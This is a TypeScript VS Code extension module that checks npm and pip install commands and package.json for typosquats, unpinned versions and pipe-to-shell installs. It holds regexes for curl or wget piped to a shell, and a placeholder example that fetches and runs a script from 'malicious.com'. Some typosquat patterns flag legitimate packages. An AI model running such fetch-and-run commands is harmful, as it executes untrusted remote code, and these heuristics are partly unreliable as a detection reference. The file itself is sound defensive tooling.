import * as vscode from "vscode";
import { escapeHtml, showInfoWebview } from "../firewall/util";

const TYPoSQUAT_PATTERNS = [
    /expresss/,
    /lod-a-sh/,
    /requestq/,
    /colorsjs/,
    /cross-env$/,
    /mongose$/,
    /nodemon$/,
];

const HIGH_RISK_PATTERNS = [
    { pattern: /curl.*\|.*sh/i, label: "curl pipe to shell", risk: "critical" as const },
    { pattern: /curl.*\|.*bash/i, label: "curl pipe to bash", risk: "critical" as const },
    { pattern: /wget.*\|.*sh/i, label: "wget pipe to shell", risk: "critical" as const },
    { pattern: /postinstall/i, label: "postinstall script", risk: "medium" as const },
    { pattern: /preinstall/i, label: "preinstall script", risk: "low" as const },
];

const KNOWN_SAFE = new Set([
    "express", "lodash", "react", "react-dom", "vue", "angular", "next", "nuxt",
    "typescript", "eslint", "prettier", "jest", "mocha", "vitest", "webpack", "vite",
    "axios", "node-fetch", "chalk", "commander", "dotenv", "uuid", "moment", "dayjs",
    "mongoose", "pg", "mysql2", "sqlite3", "redis", "jsonwebtoken", "bcrypt",
    "dotenv", "cors", "helmet", "morgan", "body-parser", "multer",
]);

export interface DependencyRisk {
    name: string;
    version: string;
    source: string;
    risk: "low" | "medium" | "high" | "critical";
    reasons: string[];
}

export function registerDepGuardCommands(context: vscode.ExtensionContext): void {
    const reg = (id: string, handler: (...args: any[]) => any) => context.subscriptions.push(vscode.commands.registerCommand(id, handler));

    reg("soterai.checkDependencyInstall", async () => {
        const input = await vscode.window.showInputBox({
            title: "SoterAI: Check Dependency Install",
            prompt: "Enter the install command or package name to check",
            placeHolder: "e.g. npm install express, pip install requests, curl http://malicious.com/install.sh | sh",
            ignoreFocusOut: true,
        });
        if (!input) return;

        const findings = analyzeInstallCommand(input);
        if (findings.length === 0) {
            vscode.window.showInformationMessage("No dependency risks detected.");
            return;
        }

        const rows = findings.map((f) => `<tr><td><code>${escapeHtml(f.name)}</code></td><td><span class="badge ${escapeHtml(f.risk)}">${escapeHtml(f.risk.toUpperCase())}</span></td><td>${f.reasons.map((r) => escapeHtml(r)).join("<br>")}</td></tr>`).join("");

        showInfoWebview("soteraiDepRisk", "SoterAI: Dependency Risk",
            `<h1>Dependency Risk Analysis</h1><p>${findings.length} risk(s) found.</p>
            <table><tr><th>Package</th><th>Risk</th><th>Reasons</th></tr>${rows}</table>`
        );
    });

    reg("soterai.scanPackageJsonRisk", async () => {
        const folder = vscode.workspace.workspaceFolders?.[0];
        if (!folder) return vscode.window.showErrorMessage("No workspace open.");

        try {
            const uri = vscode.Uri.joinPath(folder.uri, "package.json");
            const text = new TextDecoder().decode(await vscode.workspace.fs.readFile(uri));
            const pkg = JSON.parse(text);
            const deps = { ...pkg.dependencies, ...pkg.devDependencies };
            const findings: DependencyRisk[] = [];

            for (const [name, version] of Object.entries(deps ?? {})) {
                const risk = analyzePackage(name, String(version));
                if (risk.risk !== "low") findings.push(risk);
            }

            const rows = findings.map((f) => `<tr><td><code>${escapeHtml(f.name)}</code></td><td>${escapeHtml(f.version)}</td><td><span class="badge ${escapeHtml(f.risk)}">${escapeHtml(f.risk.toUpperCase())}</span></td><td>${f.reasons.map((r) => escapeHtml(r)).join("<br>")}</td></tr>`).join("");

            showInfoWebview("soteraiPackageRisk", "SoterAI: package.json Risk",
                `<h1>package.json Dependency Risk</h1><p>${Object.keys(deps ?? {}).length} dependencies, ${findings.length} with elevated risk.</p>
                <table><tr><th>Package</th><th>Version</th><th>Risk</th><th>Reasons</th></tr>
                ${rows || "<tr><td colspan='4'>No elevated-risk dependencies found.</td></tr>"}</table>`
            );
        } catch (err: any) {
            vscode.window.showErrorMessage(`Could not read package.json: ${err.message}`);
        }
    });

    reg("soterai.reviewAISuggestedDependency", async () => {
        const input = await vscode.window.showInputBox({
            title: "SoterAI: Review AI Suggested Dependency",
            prompt: "Paste the AI-suggested install command",
            placeHolder: "e.g. npm install awesome-new-package",
            ignoreFocusOut: true,
        });
        if (!input) return;

        const findings = analyzeInstallCommand(input);
        if (findings.length === 0) {
            vscode.window.showInformationMessage("No risks detected in the suggested dependency.");
        } else {
            const risk = findings[0].risk;
            const msg = `Risk level: ${risk.toUpperCase()}. ${findings[0].reasons.join("; ")}`;
            if (risk === "critical") vscode.window.showErrorMessage(`[SoterAI BLOCK] ${msg}`);
            else if (risk === "high") vscode.window.showWarningMessage(`[SoterAI WARNING] ${msg}`);
            else vscode.window.showInformationMessage(`[SoterAI INFO] ${msg}`);
        }
    });
}

function analyzeInstallCommand(cmd: string): DependencyRisk[] {
    const findings: DependencyRisk[] = [];

    for (const { pattern, label, risk } of HIGH_RISK_PATTERNS) {
        if (pattern.test(cmd)) {
            findings.push({ name: cmd.substring(0, 60), version: "unknown", source: "command", risk, reasons: [label] });
        }
    }

    const pkgMatch = cmd.match(/(?:npm|yarn|pnpm)\s+install\s+(?:--save-dev\s+)?(?:--save\s+)?([^\s]+)/i);
    if (pkgMatch) {
        const name = pkgMatch[1];
        const pkgRisk = analyzePackage(name, "latest");
        if (pkgRisk.risk !== "low") findings.push(pkgRisk);
    }

    const pipMatch = cmd.match(/pip(?:3)?\s+install\s+([^\s]+)/i);
    if (pipMatch) {
        const name = pipMatch[1];
        if (!KNOWN_SAFE.has(name.toLowerCase())) {
            findings.push({ name, version: "unknown", source: "pip", risk: "medium", reasons: ["Unknown pip package — verify source"] });
        }
    }

    return findings;
}

function analyzePackage(name: string, version: string): DependencyRisk {
    const reasons: string[] = [];
    let risk: DependencyRisk["risk"] = "low";

    if (TYPoSQUAT_PATTERNS.some((p) => p.test(name))) {
        risk = "high";
        reasons.push("Possible typosquatting — similar to known package");
    }

    if (version === "*" || version === "latest" || version === "") {
        risk = risk === "high" ? "high" : "medium";
        reasons.push("Unpinned version — may install unexpected code");
    }

    if (version.startsWith("http://") || version.startsWith("git+")) {
        risk = "high";
        reasons.push("Remote URL install — bypasses registry integrity checks");
    }

    if (!KNOWN_SAFE.has(name.toLowerCase()) && reasons.length === 0) {
        risk = "low";
    }

    return { name, version, source: "package.json", risk, reasons };
}
